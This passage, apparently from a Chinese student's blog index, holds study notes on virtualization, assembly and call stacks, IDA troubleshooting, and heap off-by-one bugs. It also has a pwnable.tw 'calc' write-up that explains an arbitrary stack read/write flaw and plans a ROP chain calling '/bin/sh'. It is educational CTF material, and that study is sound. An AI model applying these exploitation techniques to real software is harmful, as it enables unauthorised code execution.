src=\"/assets/js/Meting.min.js\"></script><p>​    \n    <div id=\"aplayer-hWRHfeSP\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"\n    ></div> </p>\n<p>​        为了跟上网校的集群重构计划，这下狠狠地开始学习运维了。</p>\n<p>​        在开始具体的openstack学习之前，首先需要学习一下一些基本的运维概念。</p>\n<h3 id=\"虚拟化-容器化\"><a href=\"#虚拟化-容器化\" class=\"headerlink\" title=\"虚拟化/容器化\"></a>虚拟化/容器化</h3><p>​        之前在学习docker的时候对于容器化已经有一个比较到位的认知了，而与容器化相对应的虚拟化并没有深入理解。</p>\n<p>​        这里的虚拟化特指服务器虚拟化。就是在一台服务器上运行虚拟运行多个服务器。</p>\n<h3 id=\"虚拟化分类\"><a href=\"#虚拟化分类\" class=\"headerlink\" title=\"虚拟化分类\"></a>虚拟化分类</h3><h4 id=\"完全虚拟化\"><a href=\"#完全虚拟化\" class=\"headerlink\" title=\"完全虚拟化\"></a>完全虚拟化</h4><p>​        利用Hypervisor，将硬件与软件完全隔离，性能较差。</p>\n<h4 id=\"准虚拟化\"><a href=\"#准虚拟化\" class=\"headerlink\" title=\"准虚拟化\"></a>准虚拟化</h4><p>​        改动操作系统，使操作系统以为自己是独立的。</p>\n<h4 id=\"操作系统层虚拟化\"><a href=\"#操作系统层虚拟化\" class=\"headerlink\" title=\"操作系统层虚拟化\"></a>操作系统层虚拟化</h4><p>​        改动操作系统，使主机成为虚拟机管理软件。</p>\n<h4 id=\"桌面虚拟\"><a href=\"#桌面虚拟\" class=\"headerlink\" title=\"桌面虚拟\"></a>桌面虚拟</h4><p>​        不讨论</p>\n<h4 id=\"硬件虚拟\"><a href=\"#硬件虚拟\" class=\"headerlink\" title=\"硬件虚拟\"></a>硬件虚拟</h4><p>​        虚拟硬件而不是虚拟操作系统。</p>\n<h3 id=\"虚拟化技术分类\"><a href=\"#虚拟化技术分类\" class=\"headerlink\" title=\"虚拟化技术分类\"></a>虚拟化技术分类</h3><p>​        </p>\n<p>​        </p>\n<p>​        </p>\n<p>​        </p>\n<p>​        </p>\n","categories":["MESS"],"tags":["SRE"]},{"title":"汇编小知识点","url":"/2021/10/13/pwn%E5%9F%BA%E7%A1%80/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-IwYFjhkz\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"\n    ></div> \n\n<p>[TOC]</p>\n<h2 id=\"汇编语言\"><a href=\"#汇编语言\" class=\"headerlink\" title=\"汇编语言\"></a>汇编语言</h2><h3 id=\"1）寻址\"><a href=\"#1）寻址\" class=\"headerlink\" title=\"1）寻址\"></a>1）寻址</h3><h5 id=\"1-直接寻址\"><a href=\"#1-直接寻址\" class=\"headerlink\" title=\"1/直接寻址\"></a>1/直接寻址</h5><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">mov     rax, fs:28h #直接寻址，fs段寄存器+偏移量。这里其实是一个canary的值。</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h5 id=\"2-间接寻址\"><a href=\"#2-间接寻址\" class=\"headerlink\" title=\"2/间接寻址\"></a>2/间接寻址</h5><p>间接在使用指针以及解引用的形式</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">mov     [rbp+var_8], rax # 寄存器相对寻址。相当于把rax，也就是这个canary值放到rbp+var_8的地方。</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"3-比例寻址\"><a href=\"#3-比例寻址\" class=\"headerlink\" title=\"3/比例寻址\"></a>3/比例寻址</h5><p>例如在数组遍历中</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">.data</span><br><span class=\"line\">arrayD 1,2,3,4</span><br><span class=\"line\">.code</span><br><span class=\"line\">mov esi,3</span><br><span class=\"line\">mov eax,arrayD[esi*4]\t\t\t\t\t;eax = 4</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>其中，比例因子“4”代表数组的元素个数，esi的值代表下标。</p>\n<h2 id=\"2）段寄存器\"><a href=\"#2）段寄存器\" class=\"headerlink\" title=\"2）段寄存器\"></a>2）段寄存器</h2><p>其实就是段的基址，起寻址索引作用。例子就比如上一个mov rax fs：28h</p>\n<h2 id=\"3）基础指令\"><a href=\"#3）基础指令\" class=\"headerlink\" title=\"3）基础指令\"></a>3）基础指令</h2><h3 id=\"1-数据传输\"><a href=\"#1-数据传输\" class=\"headerlink\" title=\"1/数据传输\"></a>1/数据传输</h3><h4 id=\"mov\"><a href=\"#mov\" class=\"headerlink\" title=\"mov\"></a>mov</h4><p>为了实现各种数据的传输，mov还有一下几种派生指令</p>\n<h5 id=\"movzx\"><a href=\"#movzx\" class=\"headerlink\" title=\"movzx\"></a>movzx</h5><p>对目的操作数进行全0拓展并且复制。</p>\n<h5 id=\"movsx\"><a href=\"#movsx\" class=\"headerlink\" title=\"movsx\"></a>movsx</h5><p>同上，但是是用1拓展而不是0。</p>\n<p>与数据传输相关的指令还有很多，以后待补充。</p>\n<h3 id=\"2-与数据相关的运算符和伪指令\"><a href=\"#2-与数据相关的运算符和伪指令\" class=\"headerlink\" title=\"2/与数据相关的运算符和伪指令\"></a>2/与数据相关的运算符和伪指令</h3><h4 id=\"offset\"><a href=\"#offset\" class=\"headerlink\" title=\"offset\"></a>offset</h4><p>返回一个偏移量</p>\n<h4 id=\"align\"><a href=\"#align\" class=\"headerlink\" title=\"align\"></a>align</h4><p>将一个变量对齐到边界。</p>\n<p>ps：对于cpu来说，处理偶地址速度会快于奇地址。</p>\n<h4 id=\"ptr\"><a href=\"#ptr\" class=\"headerlink\" title=\"ptr\"></a>ptr</h4><p>重写一个已经被声明过操作数的大小类型。</p>\n<h4 id=\"type\"><a href=\"#type\" class=\"headerlink\" title=\"type\"></a>type</h4><p>返回变量单个元素的大小</p>\n<h4 id=\"lengthof\"><a href=\"#lengthof\" class=\"headerlink\" title=\"lengthof\"></a>lengthof</h4><p>计算数组中元素的个数</p>\n<h4 id=\"sizeof\"><a href=\"#sizeof\" class=\"headerlink\" title=\"sizeof\"></a>sizeof</h4><p>返回lengthof和type的乘积</p>\n<h2 id=\"函数调用栈\"><a href=\"#函数调用栈\" class=\"headerlink\" title=\"函数调用栈\"></a>函数调用栈</h2><p>从一个简单的程序入手。</p>\n<p>程序来自你邮萌新赛pwn1-人类补习计划。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/image-20211012194601557.png\" alt=\"image-20211012194601557\"></p>\n<p>​    可以看到对栈空间进行一个初始化的操作的三行关键代码。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">push    rbp</span><br><span class=\"line\">mov     rbp, rsp</span><br><span class=\"line\">sub     rsp, 30h</span><br></pre></td></tr></table></figure>\n\n<p>然后就是人神共愤的函数调用栈环节。</p>\n<blockquote>\n<p>rbp ： 栈基址指针寄存器 。</p>\n<p>rsp ： 栈顶指针寄存器。</p>\n</blockquote>\n<p>​    之前也提到，栈是一种先进后出的数据结构，所以肯定有一端是固定的，然后另一端用来操作。这里rbp就对应固定的栈底（高地址），rsp对应一直在变化的栈顶（低地址）。</p>\n<p>​    并且因为rbp通常是固定的，所以函数的一些局部变量的索引的基址就是rbp。</p>\n<p>​    值得一提的是，以静态调试的角度来看一个程序的二进制文件，内存地址都是由低地址向高地址增长的，所以在ida中，stack的结构大致如下。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-12%20%E4%B8%8B%E5%8D%8811.11.18.png\" alt=\"截屏2021-10-12 下午11.11.18\"></p>\n<p>​     ebp也就是s的位置，很显然在esp之下。</p>\n<p>​     然而实际上，在内存空间中，栈上的数据是由高地址向低地址增长。也就是地址越小，实际离ebp越远。</p>\n<blockquote>\n<p>主调函数将参数按照调用约定依次入栈(图中为从右到左)，然后将指令指针EIP入栈以保存主调函数的返回地址(下一条待执行指令的地址)。进入被调函数时，被调函数将主调函数的帧基指针EBP入栈，并将主调函数的栈顶指针ESP值赋给被调函数的EBP(作为被调函数的栈底)，接着改变ESP值来为函数局部变量预留空间。此时被调函数帧基指针指向被调函数的栈底。以该地址为基准，向上(栈底方向)可获取主调函数的返回地址、参数值，向下(栈顶方向)能获取被调函数的局部变量值，而该地址处又存放着上一层主调函数的帧基指针值。本级调用结束后，将EBP指针值赋给ESP，使ESP再次指向被调函数栈底以释放局部变量；再将已压栈的主调函数帧基指针弹出到EBP，并弹出返回地址到EIP。ESP继续上移越过参数，最终回到函数调用前的状态，即恢复原来主调函数的栈帧。如此递归便形成函数调用栈。</p>\n</blockquote>\n<p>这段话说得非常玄学，而csapp中说得就非常简单清晰</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-13%20%E4%B8%8B%E5%8D%888.01.32.png\" alt=\"截屏2021-10-13 下午8.01.32\"></p>\n<blockquote>\n<p>当前正在执行的过程的帧总是在栈 顶。当过程P调用过程Q时，会把返回地址压人栈中，指明当Q返回时，要从P程序的哪 个位置继续执行。我们把这个返回地址当做P的栈帧的一部分，因为它存放的是与P相关 的状态。Q的代码会扩展当前栈的边界，分配它的栈帧所需的空间。在这个空间中，它可 以保存寄存器的值，分配局部变量空间，为它调用的过程设置参数。</p>\n</blockquote>\n<p>​    还有一点就是，之前也没有很正确地理解何为局部变量。虽然众所周知的知识点是说，局部变量是函数内部定义的变量，离开这个函数就无法被引用，然而我总是没有将局部变量与buf 联系起来，实际上buf，这个缓冲区，就是被调函数的局部变量。</p>\n<p>​    那么直接从动态调试的角度来研究函数调用栈。</p>\n<p>​    关于压栈的一些传参方式，可以参见<a href=\"https://fuurinko.github.io/2021/10/27/%E6%91%86%E7%83%82%E7%AC%AC%E5%85%AD%E5%A4%A9--%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%81%8F%E7%A7%BB%E8%AE%A1%E7%AE%97%E5%8E%9F%E7%90%86/\">格式化字符串偏移计算原理及pwntools fmtstr功能源码剖析</a>，这里主要讨论传参以后，有关返回地址以及栈顶栈指针变化的一些操作，以及一些奇怪的初始化相关函数的运行姿势。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-10-13%20%E4%B8%8B%E5%8D%885.14.08.png\" alt=\"截屏2021-10-13 下午5.14.08\"></p>\n<p>当执行完push rbp以及 sub rsp ，0x30以后，栈空间为0x30。</p>\n<p>此时可以注意到整个栈上存的指针都非常奇怪，也就是libc中的一些初始化函数的指令。</p>\n<p>可以联系一下ret2csu中的知识点，也就是main函数执行前_libc_start_main执行点一系列初始化操作。</p>\n<p>tbc</p>\n","categories":["MESS"],"tags":["pwn Primary"]},{"title":"pwnable-calc","url":"/2021/11/18/pwnable-calc/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-lpYpKfzf\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"\n    ></div> \n\n<h3 id=\"逆向\"><a href=\"#逆向\" class=\"headerlink\" title=\"逆向\"></a>逆向</h3><p>​        程序实现了一个简单的计算器功能。运算有加减乘除四种。</p>\n<p>​        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-18%20%E4%B8%8A%E5%8D%8810.33.21.png\" alt=\"截屏2021-11-18 上午10.33.21\"></p>\n<p>​        并且程序再次自带计时功能，需要patch。</p>\n<p>​        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-20%20%E4%B8%8A%E5%8D%889.57.37.png\" alt=\"截屏2021-11-20 上午9.57.37\"></p>\n<p>​        静态链接，所以肯定不能用ret2libc那一套，只能试图ROP一下。</p>\n<p>​        程序主要功能通过<code>get_expr</code>和<code>calculate</code>（原本不叫这个）两个函数实现。</p>\n<p>​        <code>get_expr</code>主要用于定位我们输入的字符串中运算符的位置。修改过的ida伪代码如下:</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> __cdecl <span class=\"title\">get_expr</span><span class=\"params\">(<span class=\"keyword\">int</span> input_str, <span class=\"keyword\">int</span> _1024)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> idx_0; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  <span class=\"keyword\">char</span> <span class=\"keyword\">operator</span>; <span class=\"comment\">// [esp+1Bh] [ebp-Dh]</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> i; <span class=\"comment\">// [esp+1Ch] [ebp-Ch]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  i = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">while</span> ( i &lt; _1024 &amp;&amp; read(<span class=\"number\">0</span>, &amp;<span class=\"keyword\">operator</span>, <span class=\"number\">1</span>) != <span class=\"number\">-1</span> &amp;&amp; <span class=\"keyword\">operator</span> != <span class=\"string\">&#x27;\\n&#x27;</span> ) <span class=\"comment\">//栈溢出</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( <span class=\"keyword\">operator</span> == <span class=\"string\">&#x27;+&#x27;</span></span><br><span class=\"line\">      || <span class=\"keyword\">operator</span> == <span class=\"string\">&#x27;-&#x27;</span></span><br><span class=\"line\">      || <span class=\"keyword\">operator</span> == <span class=\"string\">&#x27;*&#x27;</span></span><br><span class=\"line\">      || <span class=\"keyword\">operator</span> == <span class=\"string\">&#x27;/&#x27;</span></span><br><span class=\"line\">      || <span class=\"keyword\">operator</span> == <span class=\"string\">&#x27;%&#x27;</span></span><br><span class=\"line\">      || <span class=\"keyword\">operator</span> &gt; <span class=\"string\">&#x27;/&#x27;</span> &amp;&amp; <span class=\"keyword\">operator</span> &lt;= <span class=\"string\">&#x27;9&#x27;</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      idx_0 = i++;</span><br><span class=\"line\">      *(_BYTE *)(input_str + idx_0) = <span class=\"keyword\">operator</span>; <span class=\"comment\">// 通过循坏找到运算符的位置</span></span><br><span class=\"line\">                                                 </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  *(_BYTE *)(i + input_str) = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> i;</span><br></pre></td></tr></table></figure>\n\n<p>​        在这之后还有一个<code>init_pool</code>函数。函数参数为表达式数组的索引。大致就是初始化一个大小的100的字符串数组。</p>\n<p>​        <code>calculate</code>函数则负责进行运算。    </p>\n<p>​        实在是没有思路，于是找到了wp。不得不说pwnable.tw上面的题目每个都出得很好，几乎没有板子题，而且漏洞点都丝毫不传统。</p>\n<p>​        主要的问题还是在这个运算的逻辑上</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\">DWORD *__cdecl <span class=\"title\">eval</span><span class=\"params\">(_DWORD *num, <span class=\"keyword\">char</span> <span class=\"keyword\">operator</span>)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  _DWORD *result; <span class=\"comment\">// eax</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( <span class=\"keyword\">operator</span> == <span class=\"string\">&#x27;+&#x27;</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    num[*num - <span class=\"number\">1</span>] += num[*num];</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> ( <span class=\"keyword\">operator</span> &gt; <span class=\"string\">&#x27;+&#x27;</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( <span class=\"keyword\">operator</span> == <span class=\"string\">&#x27;-&#x27;</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      num[*num - <span class=\"number\">1</span>] -= num[*num];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> ( <span class=\"keyword\">operator</span> == <span class=\"string\">&#x27;/&#x27;</span> )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      num[*num - <span class=\"number\">1</span>] /= num[*num];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> ( <span class=\"keyword\">operator</span> == <span class=\"string\">&#x27;*&#x27;</span> )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    num[*num - <span class=\"number\">1</span>] *= num[*num];</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  result = num;</span><br><span class=\"line\">  --*num;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>​        这里<code>*num</code>，也就是<code>num[0]</code>的值，是检测到的表达式中数字的数量。</p>\n<p>​        比如我输入了1+2，那么，num[0]的值为2，如果输入+2，num[0]的值为1。</p>\n<p>​        所以根据这个计算的逻辑，如果输入+50，num[0]是1，num[1]是50，num[*num-1]就是num[1-1] = num[0] = num[0] + num[1]=50。</p>\n<p>​        如果输入的是+50+1，处理第一个加号时，num[0] = 2,num[1] = 50 ,num[2].= 1，</p>\n<p>然后num[1] += num[2] =&gt; num[1] = 51，接着处理第二个加号，也就是,num[50] += num[51]。</p>\n<p>​        num[51]显然应该是一个栈上的还没有被利用到的位置，但是这样我们已经能够将其覆盖为任意内容了，四舍五入形成了一个栈上任意地址读。</p>\n<p>​        然后后面还有一个对数组的内容的输出，相当于栈上任意地址写。</p>\n<p>​        这样我们就找到了不通过栈溢出而对栈上地址进行任意读写的方法，但想要控制程序执行流，我们注意到，存放进行计算的数字的数组不算很大，完全能够填写东西覆盖返回地址。</p>\n<p>​        </p>\n<p>​        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-02%20%E4%B8%8B%E5%8D%8811.57.33.png\" alt=\"截屏2021-12-02 下午11.57.33\"></p>\n<p>​            </p>\n<p>​        </p>\n<p>​        也就是0x5A0 + 0x4 = 0x5A4 = 1444。数组存放int类型，32位下一个int占4个字节，所以返回地址所在的位置是idx[1444/4=361]</p>\n<p>​        也就是说如果我们能够将想要的东西写入idx[361]就能控制程序执行流。但是并不能ret2libc，所以需要在栈上手动构造寄存器状态来进行系统调用。</p>\n<p>​        所以我们需要的并不是在idx[361]上填某个值，而是需要连续修改这之后一串的空间来进行rop。</p>\n<p>​        借一张图来表示我们需要的布栈状况：</p>\n<p>​        <img src=\"https://v1ckydxp.github.io/images/stack.jpg\" alt=\"stack\"></p>\n<p>​        </p>\n<p>​        其他的gadgets都可以通过ROPgadget来找到，但是字符串<code>&quot;/bin/sh&quot;</code>需要输入并确定它们在栈上的地址。</p>\n<p>​        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-03%20%E4%B8%8A%E5%8D%8812.45.13.png\" alt=\"截屏2021-12-03 上午12.45.13\"></p>\n<p>​    </p>\n<p>​        对于这个地址，首先我们可以利用我们之前的栈上任意地址读写的能力泄露calc函数的ebp地址，也即是idx[360]    ,但是我们需要的字符串是在main函数调用栈中的，所以我们需要知道main函数调用栈的esp。</p>\n<p>​        通过观察可以发现main的esp正好就是idx[361],而calc ebp和main esp的关系如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">\tmov     ebp, esp</span><br><span class=\"line\"> and     esp, 0FFFFFFF0h</span><br><span class=\"line\">sub     esp, 10h</span><br></pre></td></tr></table></figure>\n\n<p>​        也即是我们可以通过calc ebp的值来求出main esp，从而通过偏移获得<code>&quot;/bin/sh&quot;</code>的地址。</p>\n<p>​        然后根据布栈将地址依次写入栈中就行。</p>\n","categories":["STACK - ROP"],"tags":["pwnable"]},{"title":"positive sp value has been found","url":"/2021/12/10/ida%207.0%20for%20mac%E7%96%91%E9%9A%BE%E6%9D%82%E7%97%87%EF%BC%9A%20positive%20sp%20value%20has%20been%20found/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-VvtYLuJf\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"\n    ></div> \n\n\n\n<h3 id=\"0）\"><a href=\"#0）\" class=\"headerlink\" title=\"0）\"></a>0）</h3><p>​        自从抛弃虚拟机，利用ida for mac+pwndocker实现完全mac环境以后，深觉优雅的同时，也遇见了不少坑。</p>\n<p>​        其中ida的坑更是坑人于无形之中。因为如果不打开win的7.5（甚至7.6）做对比，你甚至不知道你遇见的一些奇怪的东西，是7.0 mac版特有的，已经被优化了的坑，还是自身逆向水平问题。</p>\n<p>​        作为一个逆向废物，7.0 for mac属实是给本来就逆不出的我雪上加霜，但是就算是这样，我也宁愿花时间解决问题，而不是重新回到虚拟机win的悲惨过往，因为这不优雅。（优雅这个词到底害死了多少人捏）</p>\n<h3 id=\"1）\"><a href=\"#1）\" class=\"headerlink\" title=\"1）\"></a>1）</h3><p>​        目前碰到的最多的一个问题，就是：</p>\n<p>​        <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-10%20%E4%B8%8B%E5%8D%884.13.01.png\" alt=\"截屏2021-12-10 下午4.13.01\"></p>\n<p>​        其实这个严格来讲算不上问题，因为你只需要找到main函数再f5，照样能够反编译，但是每次弹出的这个框就让我很恼火。所以解决问题的目标在于修改ida使得不再弹出这个框，而不是修改程序治标不治本捏。</p>\n<p>​        对于问题本身，其实还是比较常规，只需要patch一下就好了。</p>\n<p>​        我这里是<code>_start()</code>堆栈不平衡，</p>\n<p>​                <img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-10%20%E4%B8%8B%E5%8D%884.22.48.png\" alt=\"截屏2021-12-10 下午4.22.48\"></p>\n<p>​        问题显然出在<code>and     rsp, 0FFFFFFFFFFFFFFF0h</code>到<code>start</code>结束的这一大段。call完main以后居然没有retn。<img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-10%20%E4%B8%8B%E5%8D%884.27.29.png\" alt=\"截屏2021-12-10 下午4.27.29\"></p>\n<p>​        首先报堆栈不平衡的错误大概就是因为ida要求stack pointer在函数开头和结束时相等。然后导致堆栈不平衡，通常是因为程序本身含有代码混淆/花指令，但是这是一道pwn题，为什么要在这种地方为难人。</p>\n<p>​        我超，流汗黄豆原来是为难的意思。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-10%20%E4%B8%8B%E5%8D%885.07.12.png\" alt=\"截屏2021-12-10 下午5.07.12\"></p>\n<p>​        </p>\n<p>​        首先最让我疑惑的就是末尾的hlt指令，它取代了retn，然后它的意思是暂停指令，而不是返回。为什么这个地方会有一条这样的指令，是程序原本设计的还是ida反编译的问题？</p>\n<p>​        稍微学习了一下，意识到start函数是被拆成了三个部分，所以只反编译一个部分肯定有问题。</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-10%20%E4%B8%8B%E5%8D%885.17.51.png\" alt=\"截屏2021-12-10 下午5.17.51\"></p>\n<p>​        但是虽然这样堆栈平衡，但是还是无法反编译，我也不清楚里面是不是有什么花指令。</p>\n<p>​        和胖爷爷交流了一下，7.5及以上也会出现这个错误，但是完全可以反编译，并且start就是只有那么一段，没有后面的一堆东西。我不理解，我也修复不了，这篇文章毫无意义，但是学习了一些修复堆栈不平衡的方法（</p>\n<h3 id=\"）参考\"><a href=\"#）参考\" class=\"headerlink\" title=\"）参考\"></a>）参考</h3><p>​        <a href=\"https://blog.csdn.net/lixiangminghate/article/details/78820388\">IDA出现”sp-analysis failed”和F5(反编译)失败</a></p>\n<p>​        </p>\n","categories":["MESS"],"tags":["逆向"]},{"title":"off by one /chunk overlapping","url":"/2021/12/08/off%20by%20one/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script>\n    <div id=\"aplayer-ZNZilXsW\" class=\"aplayer aplayer-tag-marker meting-tag-marker\"\n         data-id=\"7342554262\" data-server=\"netease\" data-type=\"playlist\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"\n    ></div> \n\n<h2 id=\"Off-by-one\"><a href=\"#Off-by-one\" class=\"headerlink\" title=\"Off by one\"></a>Off by one</h2><p>​        单/空字节溢出攻击。</p>\n<p>​        通常来说简单的off by one的漏洞点来自于编写时对边界控制不严格，导致每次输入的字符都能比规定的最大字符大那么一些（一个，或者几个）。这些字节溢出到物理地址相邻的下一个堆块，就能修改下一个chunk的size或者<code>prev_inuse</code>，通过这样的溢出，就能够整一些有趣的攻击。</p>\n<p>​        通常单字节溢出的利用方式有如下几种：</p>\n<ol>\n<li>溢出字节任意可控制字节：修改chunk size，造成堆叠，泄露或覆盖其他块的数据</li>\n<li>溢出空字节：修改下一个chunk的<code>prev_inuse</code>，使得当前chunk状态为free，然后就可以：1）利用unlink进行攻击。2）对于下一个chunk来说，前一个chunk状态为free，自身的prev_size域启用，就能够伪造<code>prev_size</code>，改变前一个chunk的size，造成堆叠。</li>\n</ol>\n<p>​        </p>\n<p>​        从ctf-wiki上的一个简单的小例子开始：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">my_gets</span><span class=\"params\">(<span class=\"keyword\">char</span> *ptr,<span class=\"keyword\">int</span> size)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> i;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(i=<span class=\"number\">0</span>;i&lt;=size;i++)#栅栏错误</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        ptr[i]=getchar();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> i;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">void</span> *chunk1,*chunk2;</span><br><span class=\"line\">    chunk1=<span class=\"built_in\">malloc</span>(<span class=\"number\">16</span>);</span><br><span class=\"line\">    chunk2=<span class=\"built_in\">malloc</span>(<span class=\"number\">16</span>);</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Get Input:&quot;</span>);</span><br><span class=\"line\">    my_gets(chunk1,<span class=\"number\">16</span>);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-12-08%20%E4%B8%8B%E5%8D%882.09.13.png\" alt=\"截屏2021-12-08 下午2.09.13\">        </p>\n<p>可以看到0x1994020的最低位被覆盖为了“61”，也就是a的小端序。当然这里是因为前一个chunk属于已分配状态，所以下一个chunk的<code>prev_size</code>被内存复用为了前一个chunk的内容。</p>\n<p>以及这个字符串操作的例子</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span 